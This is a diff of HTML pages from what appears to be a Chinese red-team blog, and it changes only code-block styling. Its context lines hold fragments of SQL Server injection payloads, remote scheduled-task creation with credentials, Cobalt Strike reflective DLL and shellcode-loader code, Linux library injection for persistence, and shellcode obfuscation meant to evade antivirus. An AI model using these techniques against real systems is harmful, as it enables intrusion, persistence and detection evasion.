+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;FARPROC &lt;span style="color:#a6e22e"&gt;GetProcAddress&lt;/span&gt;(
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; HMODULE hModule, &lt;span style="color:#75715e"&gt;// 模块句柄
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; LPCSTR lpProcName &lt;span style="color:#75715e"&gt;// 函数名称
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;);
@@ -1999,7 +1999,7 @@ note right: 倾旋的博客:https://payloads.online
 &lt;p&gt;同样涉及多个角度，主动扫描、网络空间搜索引擎数据接口、组件指纹精准度、识别技术方案等。未来主动扫描可能用的会越来越少，依赖接口的会更多一些，接口只要更加实时的更新数据即可，然后确保构建好指纹的精准度，做到不漏掉一处资产的特征就很成功了。最早接触的一个网络空间搜索引擎是Shodan，我经过查阅Wiki百科发现它最早在2013年做起来，距今已经7年，在常规的渗透中，也会偶尔使用它来寻找一些有趣的资产，在IPV4的时代下，它已经算是一个“活地图”了，这里可以思考一个有趣的问题，当世界上更普遍使用IPv6以后，是否还会有类似的“活地图”呢？&lt;/p&gt;
 &lt;h3 id="第三阶段启发式漏洞的定位发现"&gt;第三阶段：启发式漏洞的定位发现&lt;/h3&gt;
 &lt;p&gt;最初这个概念是我在参与团队内部平台建设讨论时提出的，其实也不是什么新词，为了应对这个建立了大大小小的SOC（Security operations center，安全运营中心）时代，我们需要把历史的扫描器丢弃，把攻击的特征降噪、剔除更多漏洞利用的唯一性，第一步就要将漏洞的发现理解为单纯的“发现”，而非“发现”与“利用”在一起去理解。例如，某个系统存在RCE（Remote Code Execution Vulnerability，远程代码执行漏洞），利用条件是要向网站某个接口POST一段数据：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;gt; POST /handler/ HTTP/1.1
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;gt; POST /handler/ HTTP/1.1
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;gt; Host: 192.168.0.1
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;gt; User-Agent: Mozilla/5.0 &lt;span style="color:#f92672"&gt;(&lt;/span&gt;Windows NT 10.0; Win64; x64&lt;span style="color:#f92672"&gt;)&lt;/span&gt; AppleWebKit/537.36 &lt;span style="color:#f92672"&gt;(&lt;/span&gt;KHTML, like Gecko&lt;span style="color:#f92672"&gt;)&lt;/span&gt; Chrome/84.0.4147.135 Safari/537.36
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;gt; Accept: */*
@@ -2017,7 +2017,7 @@ note right: 倾旋的博客:https://payloads.online
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;....
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;假设&lt;code&gt;code&lt;/code&gt;是代码输入点，如果要进行漏洞的发现或利用，大部分人可能比较倾向于提交执行的代码：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;gt; POST /handler/ HTTP/1.1
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;gt; POST /handler/ HTTP/1.1
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;gt; Host: 192.168.0.1
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;gt; User-Agent: Mozilla/5.0 &lt;span style="color:#f92672"&gt;(&lt;/span&gt;Windows NT 10.0; Win64; x64&lt;span style="color:#f92672"&gt;)&lt;/span&gt; AppleWebKit/537.36 &lt;span style="color:#f92672"&gt;(&lt;/span&gt;KHTML, like Gecko&lt;span style="color:#f92672"&gt;)&lt;/span&gt; Chrome/84.0.4147.135 Safari/537.36
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;gt; Accept: */*
@@ -2115,7 +2115,7 @@ note right: 倾旋的博客:https://payloads.online
 &lt;h3 id="如何远程创建任务计划"&gt;如何远程创建任务计划？&lt;/h3&gt;
 &lt;p&gt;这里主要涉及到COM组件的操作，我用封装函数的方式来实现使得程序可读性变高。&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;使用凭证连接远程主机的任务计划接口：&lt;/strong&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-cpp" data-lang="cpp"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;BOOL &lt;span style="color:#a6e22e"&gt;ConnectTaskServer&lt;/span&gt;(LPCWSTR lpwsHost, LPCWSTR lpwDomain,LPCWSTR lpwsUserName, LPCWSTR lpwsPassword) {
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-cpp" data-lang="cpp"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;BOOL &lt;span style="color:#a6e22e"&gt;ConnectTaskServer&lt;/span&gt;(LPCWSTR lpwsHost, LPCWSTR lpwDomain,LPCWSTR lpwsUserName, LPCWSTR lpwsPassword) {
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	&lt;span style="color:#75715e"&gt;// 初始化COM组件
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	hr &lt;span style="color:#f92672"&gt;=&lt;/span&gt; CoInitializeEx(NULL, COINIT_MULTITHREADED);
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	&lt;span style="color:#75715e"&gt;// 设置组件安全等级
@@ -2223,7 +2223,7 @@ Accept-Language: zh-CN,zh;q=0.9
 &lt;/p&gt;
 &lt;p&gt;Flask是一个用Python编写的Web应用程序框架，它基于Werkzeug WSGI工具包和Jinja2模板引擎。&lt;/p&gt;
 &lt;p&gt;Flask也被称为“microframework” ，因为它使用简单的核心，用extension增加其他功能，它没有默认使用的数据库、窗体验证工具。&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; flask &lt;span style="color:#f92672"&gt;import&lt;/span&gt; Flask
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; flask &lt;span style="color:#f92672"&gt;import&lt;/span&gt; Flask
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;app &lt;span style="color:#f92672"&gt;=&lt;/span&gt; Flask(__name__)
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;)
@@ -2394,13 +2394,13 @@ println(&amp;#34;Stack is: &amp;#34; . @stack[0]);
 &lt;p&gt;SQL Server注入，一般也是先找库、再找表、再查字段、最终查询数据。&lt;/p&gt;
 &lt;h2 id="查库"&gt;查库&lt;/h2&gt;
 &lt;p&gt;1.查第一个：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;id&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;and&lt;/span&gt; (&lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; top &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; Name &lt;span style="color:#66d9ef"&gt;FROM&lt;/span&gt; Master..SysDatabases)&lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt; &lt;span style="color:#75715e"&gt;--
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;id&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;and&lt;/span&gt; (&lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; top &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; Name &lt;span style="color:#66d9ef"&gt;FROM&lt;/span&gt; Master..SysDatabases)&lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt; &lt;span style="color:#75715e"&gt;--
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;2.NOT IN&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;id&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;and&lt;/span&gt; (&lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; top &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; Name &lt;span style="color:#66d9ef"&gt;FROM&lt;/span&gt; Master..SysDatabases &lt;span style="color:#66d9ef"&gt;where&lt;/span&gt; name &lt;span style="color:#66d9ef"&gt;not&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;in&lt;/span&gt; (&lt;span style="color:#e6db74"&gt;&amp;#39;master&amp;#39;&lt;/span&gt;))&lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt; &lt;span style="color:#75715e"&gt;--
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;id&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;and&lt;/span&gt; (&lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; top &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; Name &lt;span style="color:#66d9ef"&gt;FROM&lt;/span&gt; Master..SysDatabases &lt;span style="color:#66d9ef"&gt;where&lt;/span&gt; name &lt;span style="color:#66d9ef"&gt;not&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;in&lt;/span&gt; (&lt;span style="color:#e6db74"&gt;&amp;#39;master&amp;#39;&lt;/span&gt;))&lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt; &lt;span style="color:#75715e"&gt;--
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其中，NOT IN的集合会不断增加，最终无法查出其他结果，那么这个集合就是所有的数据库名称。&lt;/p&gt;
 &lt;h2 id="查表"&gt;查表&lt;/h2&gt;
 &lt;p&gt;在这一步，我们就可以自动化实现了：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; requests
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; requests
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; re
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;table_list &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;]
@@ -2491,7 +2491,7 @@ println(&amp;#34;Stack is: &amp;#34; . @stack[0]);
 &lt;h2 id="反射-dll注入"&gt;反射 DLL注入&lt;/h2&gt;
 &lt;p&gt;Aggressor Script脚本提供了一些关于反射DLL的接口：https://cobaltstrike.com/aggressor-script/functions.html#bdllspawn&lt;/p&gt;
 &lt;p&gt;话不多说，先上代码：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;BOOL WINAPI &lt;span style="color:#a6e22e"&gt;DllMain&lt;/span&gt;( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved ) {
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;BOOL WINAPI &lt;span style="color:#a6e22e"&gt;DllMain&lt;/span&gt;( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved ) {
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	BOOL bReturnValue &lt;span style="color:#f92672"&gt;=&lt;/span&gt; TRUE;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	&lt;span style="color:#66d9ef"&gt;switch&lt;/span&gt;( dwReason ) {
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;		&lt;span style="color:#66d9ef"&gt;case&lt;/span&gt; DLL_QUERY_HMODULE:
@@ -2604,7 +2604,7 @@ VOID msg(VOID){
  &lt;img src="https://images.payloads.online/820ac94e-4f5f-11ec-ba78-00d861bf4abb.png" alt="2020-01-03-13-06-15" /&gt;
 &lt;/a&gt;
 &lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;Windows.h&amp;gt;;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;Windows.h&amp;gt;;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;typedef&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;VOID&lt;/span&gt; (&lt;span style="color:#f92672"&gt;*&lt;/span&gt;msg)(VOID);
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
@@ -2649,7 +2649,7 @@ VOID msg(VOID){
 &lt;/ul&gt;
 &lt;p&gt;返回值：void * 指向函数的地址，供调用使用。&lt;/p&gt;
 &lt;p&gt;劫持示例代码：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;dlfcn.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
@@ -2697,7 +2697,7 @@ VOID msg(VOID){
 &lt;/p&gt;
 &lt;p&gt;获取sample-target的PID后，调用inject程序来注入sample-library.so，注入成功会输出“I just got loaded”。
 接下来，需要更改sample-target.c文件，编译成需要的权限维持动态链接库。&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;dlfcn.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
@@ -2752,7 +2752,7 @@ VOID msg(VOID){
 &lt;/a&gt;
 &lt;/p&gt;
 &lt;p&gt;核心代码：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; i &lt;span style="color:#f92672"&gt;in&lt;/span&gt; xrange(len(payload)):
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; i &lt;span style="color:#f92672"&gt;in&lt;/span&gt; xrange(len(payload)):
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; &lt;span style="color:#f92672"&gt;not&lt;/span&gt; firstspace:
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; payload[i]&lt;span style="color:#f92672"&gt;.&lt;/span&gt;isspace():
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; firstspace &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;True&lt;/span&gt;
@@ -2790,7 +2790,7 @@ VOID msg(VOID){
 &lt;p&gt;C文件给出的是一个C语言中的字符数组，也是可以通过以字节单位操作的。&lt;/p&gt;
 &lt;h2 id="0x05-组合"&gt;0x05 组合&lt;/h2&gt;
 &lt;p&gt;由于反病毒软件对于默认生成的文件查杀较为严格，我通常会采用混淆、加密解密的方式把载荷还原。&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; sys
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; sys
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; argparse &lt;span style="color:#f92672"&gt;import&lt;/span&gt; ArgumentParser, FileType
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;process_bin&lt;/span&gt;(num, src_fp, dst_fp, dst_raw):
@@ -2839,7 +2839,7 @@ VOID msg(VOID){
 &lt;p&gt;本章只提及一下关于VirtualAlloc的建议。&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://docs.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc"&gt;https://docs.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;在申请内存页时，一定要把控好属性，可以在Shellcode读入时，申请一个普通的可读写的内存页，然后再通过VirtualProtect改变它的属性 -&amp;gt; 可执行。&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;// 入口函数
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;wmain&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; argc,TCHAR &lt;span style="color:#f92672"&gt;*&lt;/span&gt; argv[]){
@@ -2919,7 +2919,7 @@ VOID msg(VOID){
 &lt;h2 id="0x03-实现一次正常加载"&gt;0x03 实现一次正常加载&lt;/h2&gt;
 &lt;p&gt;这里我创建了一个C++项目，名字为：BadCode&lt;/p&gt;
 &lt;p&gt;先来使用cobaltstrike默认的shellcode进行加载，为了方便阅读参考，在代码中我会尽量留下注释。&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
